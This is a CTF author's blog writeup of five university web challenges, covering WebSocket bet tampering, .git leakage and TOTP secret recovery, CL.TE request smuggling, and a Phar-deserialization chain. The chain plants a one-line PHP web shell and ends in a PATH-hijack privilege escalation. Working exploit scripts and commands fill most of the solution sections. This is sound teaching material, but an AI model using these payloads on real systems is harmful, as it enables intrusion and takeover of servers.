---
title: "SpiritCTF 2026 Warm: Web Challenge Design and Writeups"
description: How I designed and solved five Web challenges for SpiritCTF 2026 Warm, with source code and writeups.
publishDate: 2026-10-10T16:33:05.299Z
tags:
  - ctf
  - web
heroImage:
  src: ../../blog/spiritctf-2026-warm-web-writeup/spiritctf-2026-web-writeup.assets/downtown.jpg
  color: "#282838"
  alt: "SpiritCTF 2026 Warm: Web Challenge Design and Writeups"
language: en
draft: false
slug: spiritctf-2026-warm-web-writeup
---

> Until now, I'd always taken part in CTFs as a player. This time, I got to write some of the Web challenges for my university's SpiritCTF 2026 Warm. Designing challenges taught me a lot: I had to think about the intended vulnerabilities, prevent unintended solutions, write the applications, and get everything running in Docker. It was a lot of work, but I came away with plenty of experience.
>
> This post walks through the solutions to those challenges. If you'd like to try them yourself first, you're welcome to download them from my GitHub repository and run them locally. If you've read my earlier posts, you'll probably recognize a few ideas I borrowed from challenges I enjoyed, meow. Many thanks to their authors, too!

<github-card data-repo="residream/2026-SpiritCTF-Warm-Web" data-description="My Web challenges for SpiritCTF 2026 Warm, with source code, Docker build files, and writeups."><a href="https://github.com/residream/2026-SpiritCTF-Warm-Web">2026 SpiritCTF Warm · Web challenge source code and writeups</a></github-card>

## ez_gambling

### Reconnaissance

The site is a slot machine. You start with `100` chips, while redeeming the prize costs `1000000` chips.

The Network tab in DevTools shows that placing bets, restarting the game, and redeeming the prize all use `WebSocket`.

The connection code is in `app.js`:

```
const socket = new WebSocket(`${location.protocol === "https:" ? "wss" : "ws"}://${location.host}/ws`);
ws = socket;
```

Before sending a message, the frontend converts the object to `JSON`:

```
ws.send(JSON.stringify(packet));
```

So the communication endpoint is:

```
/ws
```

### Frontend Validation

When the betting form is submitted, the frontend requires the bet to be an integer from `1` to `100`:

```js
const bet = Number(betInput.value);
if (!Number.isInteger(bet) || bet < 1 || bet > 100) {
  tell("下注金额必须是 1～100 的整数。", "error");
  return;
}
if (bet > state.cash) {
  tell("筹码不足。", "error");
  return;
}
send({ type: "spin", bet });
```

In other words, a value such as `bet=-1000000` cannot be sent through the normal form controls.

But those checks run only in the browser. A player can construct a `WebSocket` message directly and bypass the form validation. If the backend trusts that input without validating it again, there may be a vulnerability.

### Exploitation

Intercept the traffic with Burp Suite and change the original `WebSocket` message:

```
{"type":"spin","bet":10}
```

To:

```
{"type":"spin","bet":-1000000}
```

The response shows that our `cash` has increased:

```
{"type":"spin","result":{"symbols":["🍋","💎","🍉"],"bet":-1000000,"multiplier":0,"payout":0,"round":2},"state":{"cash":1000090,"spins":2,"flagBought":false,"rules":{"startCash":100,"minBet":1,"maxBet":100,"maxSpins":20,"flagCost":1000000},"symbols":["🍒","🍋","🍇","🍉","⭐","💎","🔔"],"history":[{"round":2,"bet":-1000000,"symbols":["🍋","💎","🍉"],"multiplier":0,"payout":0,"cash_after":1000090},{"round":1,"bet":10,"symbols":["🍒","🍋","🍇"],"multiplier":0,"payout":0,"cash_after":90}]}}
```

Redeem the prize to get the `flag`.

## Escape the Backrooms

### Solution

The homepage says that every room has a unique ID and explicitly mentions BFS.

After entering the maze through `/flag/`, taking the left or right door appends `/l` or `/r` to the current URL.

In the page source, `data-room-id` identifies the room, while `data-room-state` tells us whether it is a normal room, a dead end, or the exit.

Different routes can lead back to the same room, so the URL cannot serve as the node identifier.

Track visited rooms by their IDs and explore the left and right doors in BFS order. The first time we reach the exit, the recorded route is the shortest one.

Dead ends have no doors to explore, and rooms we have already visited do not need to be expanded again.

The exit page shows only an image and `freedom?`. Comments in the source ask, “Can you read binary?” and “Is your route already the shortest?”

Replace each `l` in the shortest route with `0` and each `r` with `1`, group the bits into bytes of eight, then decode them as UTF-8 to recover the flag.

**solve.py**

```python
import re
import requests
from collections import deque
from time import perf_counter
from urllib.parse import urljoin, urlsplit

base = "https://jqeo5a2wkvx4.challenge.jlu-terminal.site"
TIMEOUT = 10


def fetch(s, url):
    r = s.get(url, timeout=TIMEOUT)
    r.raise_for_status()

    room = re.search(r'data-room-id="([^"]+)"', r.text)
    state = re.search(r'data-room-state="([^"]+)"', r.text)
    if not room or not state or state[1] not in ("room", "dead-end", "exit"):
        raise RuntimeError(f"不是有效的房间页面：{url}")

    doors = re.findall(r'<a\b[^>]*id="door-(left|right)"[^>]*href="([^"]+)"', r.text)
    origin = urlsplit(url)
    links = []
    for side, href in doors:
        target = urljoin(r.url, href)
        parsed = urlsplit(target)
        if (parsed.scheme, parsed.netloc) != (origin.scheme, origin.netloc):
            raise RuntimeError("门链接离开了题目站点")
        links.append(("l" if side == "left" else "r", target))

    return room[1], state[1], links


entry = urljoin(base.rstrip("/") + "/", "flag/")
queue = deque([(entry, "")])
seen = set()
calls = 0
started = perf_counter()

with requests.Session() as s:                    # 复用连接，避免每个房间重新建立 TCP 连接
    while queue:
        url, path = queue.popleft()
        room, state, doors = fetch(s, url)
        calls += 1
        if room in seen:                         # 不同路线可能回到同一个房间
            continue
        seen.add(room)
        if len(seen) > 10000:
            raise RuntimeError("房间过多，请检查地址或确认地图没有重启")

        if state == "exit":                      # BFS 首次找到出口时，路线一定最短
            bits = path.translate(str.maketrans("lr", "01"))
            if not bits or len(bits) % 8:
                raise RuntimeError("最短路线长度不是 8 的倍数")
            flag = bytes(int(bits[i:i + 8], 2) for i in range(0, len(bits), 8)).decode("utf-8")
            print("出口 URL：", url)
            print(f"最短路线：{len(path)} 步；HTTP 请求：{calls} 次；耗时：{perf_counter() - started:.2f} 秒")
            print("Flag:", flag)
            break

        for move, target in doors:
            queue.append((target, path + move))
    else:
        raise RuntimeError("未找到出口")
```

### How the Challenge Works

The backend first encodes the flag as UTF-8 bytes, then converts them into a binary string.

Each bit corresponds to one choice along the main route: `0` means take the left door, and `1` means take the right door.

At each room, the other door leads into a randomly generated branch. A branch may loop, end in a dead end, or take a detour back to the next room on the main route.

Branches cannot skip main-route nodes that have not yet been reached. A detour to the next main-route room is also longer than going there directly. This makes the shortest route to the exit unique, with its directions matching every bit of the flag.

Other routes may still reach the exit, but they can contain extra directions, so decoding them the same way will not necessarily recover the flag.

`outside.jpg` is just the exit scene; it contains no flag. The image stays in `challenge/app/assets/`, and `/outside/<route>` returns it only when given a valid route to the exit.

If `MAZE_SEED` is left empty, the application generates a random seed when it creates the maze. All requests during that service run use the same map. With a fixed seed and the same flag, the map remains identical across restarts and multiple instances.

`.env` holds the local defaults and is not included in the image. When starting the application with Compose, environment variables in the process launching Compose take precedence over `.env`. If a platform runs the image directly, supply the configuration through container environment variables; it will not read the host's `.env` file.

## Spirit Notes

The challenge description mentions Git and an unfinished application, so I tried scanning it with dirsearch.

Sure enough, the scan found an exposed `/.git/` directory:

```bash
[15:49:49] Scanning: 
[15:49:49] 200 -    13B - /.git/description                                 
[15:49:49] 200 -    92B - /.git/config
[15:49:49] 200 -    21B - /.git/HEAD                                        
[15:49:49] 200 -    2KB - /.git/index                                       
[15:49:49] 200 -     0B - /.git/info/exclude                                
[15:49:49] 200 -    57B - /.git/info/refs
[15:49:49] 200 -   748B - /.git/logs/HEAD                                   
[15:49:49] 200 -     0B - /.git/objects/info/packs                          
[15:49:52] 303 -   199B - /explore  ->  /login                              
[15:49:52] 200 -    16B - /healthz                                          
[15:49:52] 200 -    3KB - /login                                            
[15:49:52] 405 -    1KB - /logout                                           
[15:49:53] 200 -    3KB - /register                                         
[15:49:53] 200 -    34B - /robots.txt                                       
[15:49:53] 303 -   199B - /settings  ->  /login                             
[15:49:53] 303 -   205B - /setup  ->  /register                             
[15:49:53] 404 -    2KB - /setup.php
[15:49:53] 404 -    2KB - /sfsites/aura
[15:49:53] 404 -    2KB - /setup.sql
[15:49:53] 404 -    2KB - /setup/
```

I used `git-dumper` to recover the repository. In this case, it recovered more than `GitHack` and let me inspect the Git history as well.

```bash
git-dumper http://127.0.0.1:3003/.git/ ./127.0.0.1:3003
cd 127.0.0.1:3003
```

Once recovery is complete, the output directory is a Git repository whose history we can inspect directly. Check the commits:

```bash
git log --all --oneline --stat
```

The history shows that a login debug log was deleted. Use the commit hash from your own output:

```
48ddc70 Remove expired admin login trace debug/admin-login.log
 debug/admin-login.log | 5 -----
 1 file changed, 5 deletions(-)
d6f58f5 Initial Spirit Notes with admin login trace
```

Read the historical file from the earliest commit:

```bash
git show d6f58f5:debug/admin-login.log
```

This reveals two expired admin TOTP records, for example:

```text
# 调试 admin 登录流程时留下了几行日志
# 小R：反正验证码已经过期，不删除也没什么关系

[2026-09-05T03:39:22Z] account=admin otp=746928 result=ok
[2026-09-05T03:43:01Z] account=admin otp=201990 result=ok
```

Next, inspect the recovered `mfa.py` to see how TOTP secrets are generated:

```python
def derive_secret(username, created_at):
    # 换设备时可以重建同一份通行证。
    material = f"{username}:{created_at}".encode("utf-8")
    digest = hashlib.sha256(material).digest()
    return base64.b32encode(digest[:20]).decode("ascii")
```

The admin's secret therefore depends only on the string `admin` and the time the admin account was created.

Registering and signing in normally also reveals that the application automatically creates a welcome note. The admin happens to have made their own welcome note public, exposing their registration time:

```
admin · 2026-09-04 12:32 UTC+08:00
```

However, `app.py` shows that the displayed time omits the seconds:

```python
def display_time(timestamp, exact=False):
    pattern = "%Y-%m-%d %H:%M:%S" if exact else "%Y-%m-%d %H:%M"
    return datetime.fromtimestamp(int(timestamp), DISPLAY_TZ).strftime(pattern)
```

So we only need to enumerate the seconds within that minute to find the admin's exact registration time.

**solve.py**

```python
import base64
import hashlib
import hmac
import struct
from datetime import datetime, timedelta, timezone

admin_created_minute = "2026-09-04 12:32"

records = [
    ("2026-09-05T03:39:22Z", "746928"),
    ("2026-09-05T03:43:01Z", "201990"),
]


def utc_ts(s):
    return int(datetime.strptime(s, "%Y-%m-%dT%H:%M:%SZ").replace(tzinfo=timezone.utc).timestamp())


def local_minute_ts(s):
    return int(datetime.strptime(s, "%Y-%m-%d %H:%M").replace(tzinfo=timezone(timedelta(hours=8))).timestamp())


def make_secret(created_at):
    return hashlib.sha256(f"admin:{created_at}".encode()).digest()[:20]


def totp(secret, t):
    msg = struct.pack(">Q", t // 30)
    digest = hmac.new(secret, msg, hashlib.sha1).digest()
    offset = digest[-1] & 15
    code = (struct.unpack(">I", digest[offset:offset + 4])[0] & 0x7fffffff) % 1000000
    return f"{code:06d}"


records = [(utc_ts(t), code) for t, code in records]
start = local_minute_ts(admin_created_minute)

for created_at in range(start, start + 60):
    secret = make_secret(created_at)
    if all(totp(secret, t) == code for t, code in records):
        print("created_at =", created_at)
        print("secret =", base64.b32encode(secret).decode())
        break
else:
    print("not found")
```

Set `admin_created_minute` to the creation time shown in the public note, and put the two historical records into `records`. Enumerating the 60 timestamps in that minute lets us recover the admin's `created_at` and `secret`:

```sh
created_at = 1788496352
secret = T6RX3HER4IWX2OOOIXPHZNFUB3XWOUSW
```

With the secret, a TOTP script can generate the current six-digit verification code.

**totp.py**

```python
import pyotp

secret = "T6RX3HER4IWX2OOOIXPHZNFUB3XWOUSW"
totp = pyotp.TOTP(secret)
print(totp.now())
```

Sign in as admin at `/login` to find the flag in the admin's private notes.

## R0b0ts

The homepage is a robot newspaper, mostly complaining about humans. It does not directly hint at any `Web` vulnerability. With the challenge named `R0b0ts`, my first thought was to visit `/robots.txt`.

That initially returns nothing useful:

```
User-agent: *
Disallow: /

# Humans read robots.txt the way they read warning labels:
# as a map to the shelves they were told not to scrape.
# Every Disallow line became a promise they meant to break.
```

But the `robots` theme suggests that only a real `bot` might receive useful information, so I tried a common search-engine crawler's User-Agent.

Using `User-Agent: Googlebot` works:

```
User-agent: *
Allow: /crawler
Disallow: /archive

# Indexing identity accepted.
# Publication manifest: /crawler
```

Keeping that User-Agent, visit `/crawler`:

```html
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Crawler Intake</title>
  <style>
    body { margin: 0; background: #111; color: #eee; font: 16px/1.6 Georgia, serif; }
    main { max-width: 860px; margin: 48px auto; padding: 32px; border: 1px solid #555; background: #181818; }
    h1 { font-size: 2rem; letter-spacing: .06em; text-transform: uppercase; }
    table { width: 100%; border-collapse: collapse; margin: 24px 0; }
    th, td { border: 1px solid #555; padding: 10px 12px; vertical-align: top; }
    th { width: 220px; text-align: left; color: #f0d48a; }
    code, pre { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; }
    pre { overflow: auto; padding: 16px; background: #090909; border: 1px solid #444; }
  </style>
</head>
<body>
<main>
  <h1>Crawler Intake Desk</h1>
  <p>Recognized indexing agents may submit manifests for archival review. Published pages remain open to all visitors, while archive records are handled separately.</p>
  <table>
    <tr><th>Manifest endpoint</th><td><code>POST /crawler/submit</code></td></tr>
    <tr><th>Accepted clients</th><td>Recognized crawler identities</td></tr>
    <tr><th>Processing</th><td>Submissions pass through the gateway before archival review</td></tr>
    <tr><th>Receipt</th><td>Returned after the archive accepts the manifest</td></tr>
  </table>
  <pre>POST /crawler/submit HTTP/1.1
Host: edition.local
User-Agent: recognized crawler
Content-Type: text/plain
Content-Length: 3
Connection: keep-alive

xxx</pre>
</main>
</body>
</html>
```

Then `/archive`:

```
The public gateway will not open the archive shelf.
```

The hint `Published pages remain open to all visitors, while archive records are handled separately.` suggests that the frontend and backend may enforce different access checks, so I tried `CL.TE` request smuggling.

**solve.py**

```python
import socket

DEFAULT_TARGET = "http://challenge.jlu-terminal.site"
DEFAULT_TIMEOUT = 3.0
HOST = "jrrefku91vuh.challenge.jlu-terminal.site"
PORT = 41583
TIMEOUT = 3
HOST_HEADER = f"{HOST}:{PORT}".encode()

# 第二个请求(走私)
smuggled = (
    b"0\r\n\r\n"
    b"GET /archive HTTP/1.1\r\n"
    b"Host: " + HOST_HEADER + b"\r\n"
    b"User-Agent: Googlebot\r\n"
    b"Connection: keep-alive\r\n\r\n"
)

# 第三个请求，留给前端，当作下一次正常请求，用来顶出排队的 flag 响应
flush = (
    b"GET / HTTP/1.1\r\n"
    b"Host: " + HOST_HEADER + b"\r\n"
    b"Connection: close\r\n\r\n"
)

# 第一个请求
payload = (
    b"POST /crawler/submit HTTP/1.1\r\n"
    b"Host: " + HOST_HEADER + b"\r\n"
    + f"Content-Length: {len(smuggled)}\r\n".encode()
    + b"User-Agent: Googlebot\r\n"
    + b"Transfer-Encoding: chunked\r\n"
    + b"Connection: keep-alive\r\n\r\n"
    + smuggled
    + flush
)

print(f"Content-Length = {len(smuggled)}")
print(f"总发送字节数 = {len(payload)}\n")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(TIMEOUT)
s.connect((HOST, PORT))
s.sendall(payload)

resp = b""
try:
    while True:
        data = s.recv(4096)
        if not data:
            break
        resp += data
except socket.timeout:
    print("超时")

print(resp.decode("utf-8", errors="replace"))
s.close()
```

Running the script returns the flag.

## Darkroom

The site opens with a login and registration page. After signing up and logging in, we enter a gallery displaying a few pictures, with features such as submissions and a recycle bin.

Submissions accept local files in `JPG`, `PNG`, or `GIF` format. Uploaded images then appear in the gallery.

First, some reconnaissance.

Capturing traffic with Burp Suite shows that viewing an image's details sends this HTTP request:

```http
GET /image/info?path=uploads%2Fseed%2Falley.jpg HTTP/1.1
Host: 127.0.0.1:3000
sec-ch-ua-platform: "macOS"
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36
sec-ch-ua: "Chromium";v="152", "Not?A_Brand";v="24", "Google Chrome";v="152"
sec-ch-ua-mobile: ?0
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
```

A straightforward path traversal attempt should fail here.

The HTTP headers identify the PHP version as `PHP/7.4.33`.

Scan the site's directories with `dirsearch`:

```bash
[18:07:47] Scanning: 
[18:07:48] 403 -   548B - /admin/.config                                    
[18:07:48] 403 -   548B - /admin/.htaccess                                  
[18:07:48] 403 -   548B - /administrator/.htaccess                          
[18:07:48] 403 -   548B - /admpar/.ftppass                                  
[18:07:48] 403 -   548B - /admrev/.ftppass                                  
[18:07:48] 403 -   548B - /app/.htaccess                                    
[18:07:48] 403 -   548B - /assets/                                          
[18:07:48] 301 -   162B - /assets  ->  http://127.0.0.1/assets/             
[18:07:48] 200 -   11KB - /backup.tar.gz                                    
[18:07:48] 403 -   548B - /bitrix/.settings.php.bak                         
[18:07:48] 403 -   548B - /bitrix/.settings.bak                             
[18:07:48] 403 -   548B - /bitrix/.settings                                 
[18:07:49] 403 -   548B - /cache/                                           
[18:07:49] 301 -   162B - /cache  ->  http://127.0.0.1/cache/               
[18:07:49] 200 -    1KB - /docpicker/internal_proxy/https/127.0.0.1:9043/ibm/console
[18:07:49] 301 -   162B - /errors  ->  http://127.0.0.1/errors/             
[18:07:49] 403 -   548B - /errors/                                          
[18:07:49] 403 -   548B - /ext/.deps                                        
[18:07:49] 302 -     0B - /gallery  ->  /login                              
[18:07:50] 403 -   548B - /lib/flex/uploader/.actionScriptProperties        
[18:07:50] 403 -   548B - /lib/flex/uploader/.flexProperties
[18:07:50] 403 -   548B - /lib/flex/uploader/.project
[18:07:50] 403 -   548B - /lib/flex/uploader/.settings
[18:07:50] 403 -   548B - /lib/flex/varien/.actionScriptProperties
[18:07:50] 403 -   548B - /lib/flex/varien/.flexLibProperties
[18:07:50] 403 -   548B - /lib/flex/varien/.project
[18:07:50] 403 -   548B - /lib/flex/varien/.settings
[18:07:50] 200 -    1KB - /login                                            
[18:07:50] 200 -    1KB - /login/                                           
[18:07:50] 302 -     0B - /logout  ->  /                                    
[18:07:50] 302 -     0B - /logout/  ->  /                                   
[18:07:50] 403 -   548B - /mailer/.env                                      
[18:07:51] 302 -     0B - /profile  ->  /login                              
[18:07:51] 200 -    1KB - /register                                         
[18:07:51] 403 -   548B - /resources/.arch-internal-preview.css             
[18:07:51] 403 -   548B - /resources/sass/.sass-cache/
[18:07:51] 403 -   548B - /twitter/.env                                     
[18:07:51] 302 -     0B - /upload  ->  /login                               
[18:07:51] 302 -     0B - /upload/  ->  /login                              
[18:07:51] 403 -   548B - /uploads/                                         
[18:07:51] 301 -   162B - /uploads  ->  http://127.0.0.1/uploads/
```

The results include `/backup.tar.gz`, an exposed backup.

Download it to get the challenge's source code:

```
var
└── www
    └── app
        ├── app
        │   ├── Auth.php
        │   ├── bootstrap.php
        │   ├── Controllers
        │   │   ├── AuthController.php
        │   │   ├── GalleryController.php
        │   │   ├── PhotoController.php
        │   │   ├── ProfileController.php
        │   │   └── TrashController.php
        │   ├── Database.php
        │   ├── Gadgets
        │   │   ├── CacheWriter.php
        │   │   ├── ImageCache.php
        │   │   └── Logger.php
        │   ├── helpers.php
        │   ├── init_db.php
        │   ├── Router.php
        │   └── Views
        │       ├── error.php
        │       ├── gallery.php
        │       ├── layout.php
        │       ├── login.php
        │       ├── photo.php
        │       ├── profile.php
        │       ├── register.php
        │       ├── trash.php
        │       └── upload.php
        ├── public
        │   ├── assets
        │   │   ├── app.css
        │   │   └── app.js
        │   ├── cache
        │   ├── errors
        │   │   └── 413.html
        │   └── index.php
        └── schema.sql
```

Focus on the application logic.

A closer review turns up the following:

`PhotoController` handles image-related operations. Its `cacheUploadMeta()` method writes metadata for a newly uploaded image to a cache file.

```php
private function cacheUploadMeta($photoId, $rel, $title, $caption, $info)
{
    $writer = new CacheWriter();
    $writer->dir = CACHE_DIR;

    $logger = new Logger();
    $logger->writer = $writer;
    $logger->key = 'photo-' . (int)$photoId . '.json';
    $logger->buffer = json_encode([
        'id' => (int)$photoId,
        'file' => $rel,
        'title' => $title,
        'caption' => $caption,
        'width' => $info[0] ?? null,
        'height' => $info[1] ?? null,
        'mime' => $info['mime'] ?? null,
    ], JSON_UNESCAPED_UNICODE);

    $cache = new ImageCache();
    $cache->logger = $logger;
    unset($cache);
}
```

It creates a `writer` object from `CacheWriter`, a small utility class that writes content to a file in a given directory. The `dir` property controls the directory, while the `key` passed to its save method determines the filename.

```php
<?php
class CacheWriter
{
    public $dir;
    public $enabled = true;

    public function save($key, $data)
    {
        if (!$this->enabled) return false;
        return @file_put_contents(rtrim($this->dir, '/') . '/' . $key, $data);
    }
}
```

It then creates a `logger` object from `Logger`. This class acts as an intermediary: it does not write files itself, but stores the information needed to do so. Its `writer` property determines which object performs the write, `key` determines the filename, and `buffer` holds the content. Its `flush` method calls the writer's `save` method.

```php
<?php
class Logger
{
    public $writer;
    public $key;
    public $buffer;

    public function flush()
    {
        if ($this->writer instanceof CacheWriter) {
            $this->writer->save($this->key, $this->buffer);
        }
    }
}
```

Finally, it creates a `cache` object from `ImageCache`. This object does not write files directly either. Instead, it holds a `logger` and calls the logger's `flush` method when the cache object is destroyed.

```php
<?php
class ImageCache
{
    public $logger;
    public $dirty = true;

    public function __destruct()
    {
        if ($this->dirty && $this->logger instanceof Logger) {
            $this->logger->flush();
        }
    }
}
```

These classes give us the pieces of a `POP chain`: controlling `dir`, `key`, and `buffer` would let us write an arbitrary file. Deserialization is the obvious direction to investigate. PHP normally deserializes objects through `unserialize()`, but there are no calls to `unserialize()` anywhere in the source.

Continuing the review, `PhotoController` also has an `info` method:

```php
public function info()
{
    require_login();
    header('Content-Type: application/json; charset=utf-8');
    $path = $_GET['path'] ?? '';
    if (strpos($path, 'uploads/') === false) {
        echo json_encode(['error' => 'invalid path']);
        return;
    }
    $sz = @getimagesize($path);
    echo json_encode([
        'width'  => $sz[0]      ?? null,
        'height' => $sz[1]      ?? null,
        'mime'   => $sz['mime'] ?? null,
    ]);
}
```

It calls @[getimagesize](https://www.php.net/manual/zh/function.getimagesize.php):

```php
getimagesize(string $filename, array &$imageinfo = null): array|false
```

This function reads an image's dimensions and type from its headers without decoding the entire image. That makes it fast, but it is not a reliable way to validate an image.

Here, `$path` is barely checked: it only needs to contain `uploads/`.

This is where the [phar](https://www.php.net/manual/zh/book.phar.php):// stream wrapper comes in.

A `Phar` is a PHP archive, similar in purpose to a JAR file. It bundles multiple files into one, letting PHP access them and execute the PHP code inside without extracting the archive first. Its structure is:

```
1. Stub       // Phar entry-point code
2. manifest   // Archive metadata
3. contents   // Archive contents
4. signature  // Signature
```

The `Stub` identifies the Phar file and serves as its entry point. It is a small piece of PHP code with a required format:

```php
xxx<?php xxx; __HALT_COMPILER();?>
```

The preceding content is flexible, but the PHP statement must include `__HALT_COMPILER()` for PHP to recognize the file as a Phar archive. That flexibility also lets us give it the appearance of another file type, such as a `GIF`.

The `manifest` stores file attributes, permissions, and other information. This is the deserialization entry point because it holds user-defined `Meta-data` in serialized form.

The `contents` section holds the files in the Phar archive.

The `signature` is an optional signature section.

In the PHP 7.4 environment used by this challenge, opening an archive through `phar://` parses it as a Phar and deserializes its metadata.

Since `getimagesize` actually opens the file through PHP's stream layer, it can trigger `phar` processing and, in turn, deserialization.

The `upload` method in `PhotoController` shows where submitted images end up:

```php
$dir = UPLOAD_DIR . '/' . $u['id'];
@mkdir($dir, 0775, true);
$name = bin2hex(random_bytes(6)) . '.' . $ext;
```

Their paths contain `uploads/`. The filenames are randomized, but the actual filename can be found in the page source.

The full chain is now in place:

```
1. Build a malicious manifest and a stub that lets the file be recognized as both GIF and Phar, so it passes the upload checks and can be opened through phar://.
2. Determine dir from the backup structure. Here, only /var/www/app/public/uploads and /var/www/app/public/cache are writable.
3. Upload the GIF, then supply the crafted path to getimagesize to trigger deserialization.
4. Write a one-line PHP web shell and use it to get a shell.
```

**solve.php**

```php
<?php
class CacheWriter
{
    public $dir;
    public $enabled = true;
}
class ImageCache
{
    public $logger;
    public $dirty = true;
}
class Logger
{
    public $writer;
    public $key;
    public $buffer;
}

$cw = new CacheWriter();
$cw->dir = '/var/www/app/public/uploads';

$l = new Logger();
$l->writer = $cw;
$l->key = "cmd.php";
$l->buffer = '<?php system($_POST["c"]); ?>';

$ic = new ImageCache();
$ic->logger = $l;

$p = new Phar('exp.phar');
$p->startBuffering();
$p->setStub("GIF89a<?php __HALT_COMPILER();?>");
$p->setMetadata($ic);
$p->addFromString("1.txt","1");
$p->stopBuffering();
rename('exp.phar', 'exp.gif');
```

Upload `exp.gif`.

Find its actual filename on the page.

Visit `http://127.0.0.1:3000/image/info?path=phar:///var/www/app/public/uploads/2/2f85f214d2ce.gif` to trigger Phar deserialization.

Connect with AntSword to get a shell.

Searching with find does not locate the flag, and `/root` is inaccessible. It looks like we need to escalate privileges.

```bash
(www-data:/) $ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```bash
(www-data:/) $ sudo -l
Matching Defaults entries for www-data on 479738a54e46:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
User www-data may run the following commands on 479738a54e46:
    (root) NOPASSWD: /opt/photo/maintenance.sh
```

```bash
(www-data:/) $ cat /opt/photo/maintenance.sh
#!/bin/bash
export PATH=/opt/photo/bin:$PATH
echo "[maintenance] $(date '+%F %T') rebuilding thumbnail cache ..."
photo-optimize /var/www/app/public/uploads 2>/dev/null || true
identify -version >/dev/null 2>&1 || true
echo "[maintenance] done."
```

This is a clear case of `PATH-based privilege escalation`. The script invokes `photo-optimize` without an absolute path, so the system looks for it in `PATH`. The first directory in `PATH` is `/opt/photo/bin`, which is writable by `www-data`.

```bash
(www-data:/) $ ls -la /opt/photo/bin
total 8
drwxrwxr-x 2 root www-data 4096 Sep 14 10:05 .
drwxr-xr-x 1 root root     4096 Sep 14 10:05 ..
```

We can therefore place a fake `photo-optimize` in `/opt/photo/bin` to escalate privileges and read the flag.

```bash
(www-data:/) $ printf '#!/bin/sh\nls /root' > /opt/photo/bin/photo-optimize
(www-data:/) $ chmod +x /opt/photo/bin/photo-optimize
(www-data:/) $ sudo /opt/photo/maintenance.sh
[maintenance] 2026-09-14 10:43:13 rebuilding thumbnail cache ...
flag
[maintenance] done.
(www-data:/) $ printf '#!/bin/sh\ncat /root/flag' > /opt/photo/bin/photo-optimize
(www-data:/) $ chmod +x /opt/photo/bin/photo-optimize
(www-data:/) $ sudo /opt/photo/maintenance.sh
sudo: unable to send audit message: Operation not permitted
[maintenance] 2026-09-14 11:10:19 rebuilding thumbnail cache ...
flag{TH3-baCkUP-rev34L5_A-g1F-PHaR_thAT-HIJ@ckS_THe_P@th0}
[maintenance] done.
```
